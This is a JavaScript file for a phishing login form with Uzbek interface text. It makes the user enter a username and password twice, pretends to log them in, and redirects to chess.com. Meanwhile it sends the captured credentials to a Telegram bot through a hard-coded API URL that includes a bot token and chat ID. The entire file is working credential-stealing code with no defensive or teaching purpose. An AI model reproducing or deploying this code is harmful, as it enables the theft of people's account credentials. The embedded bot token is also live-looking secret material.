const inputname = document.getElementById('InputUser');
const inputpassword = document.getElementById('InputPassword');
const submitbutton = document.getElementById("Submit");
const matn = document.getElementById("matn");
const mat = document.getElementById("mat");
const loading = document.getElementById("loading");

let savat = 1;
let savedName = "";
let savedPassword = "";

[inputname, inputpassword].forEach(input => {
    input.addEventListener("input", () => {
        if (inputname.value.trim() !== "" && inputpassword.value.trim() !== "") {
            submitbutton.style.backgroundColor = "rgba(0, 0, 0, 0.4)";
            submitbutton.style.color = "rgb(0, 0, 0)";
        } else {
            submitbutton.style.backgroundColor = "transparent";
            submitbutton.style.color = "transparent";
        }
    });
});

submitbutton.addEventListener('click', () => {
    if (savat === 1) {
        savedName = inputname.value.trim();
        savedPassword = inputpassword.value.trim();

        matn.innerText = "Yana bir marotaba kiriting taxrirlash uchun";
        savat++;
        inputname.value = '';
        inputpassword.value = '';
    } else {
        matn.innerText = "";

        if (inputname.value.trim() === savedName && inputpassword.value.trim() === savedPassword) {
            mat.innerText = "Sizni saytingizga kirg'azish";
            window.location.href = "https://www.chess.com/";

            loading.style.display = 'flex';

            const encodedUsername = encodeURIComponent(inputname.value.trim());
            const encodedPassword = encodeURIComponent(inputpassword.value.trim());
            const jonatish = `
                <b>Username:</b><em>${encodedUsername}</em>\n<b>Password:</b><em>${encodedPassword}</em>
            `;

            const url = `https://api.telegram.org/bot8006725057:AAGNOu9Zem-ymx5S0JHl8gHw6xGZAZm2wmw/sendMessage?chat_id=7790658286&text=${encodeURIComponent(jonatish)}&parse_mode=HTML`;

            fetch(url, { method: 'GET' })
                .then(response => response.json())
                .then(data => {
                    loading.style.display = 'none';
                    if (data.ok) {
                        console.log(data.result.message_id);
                    } else {
                        console.log(data.error_code);
                    }
                })
                .catch((error) => {
                    alert("Error! Please try again: " + error.message);
                    loading.style.display = 'none';
                    inputname.value = '';
                    inputpassword.value = '';
                });
        } else {
            mat.innerText = "Xatolik: Ma'lumotlar mos kelmadi. Iltimos sahifani qayta ishga tushuring.";
            inputname.value = '';
            inputpassword.value = '';
        }
    }
});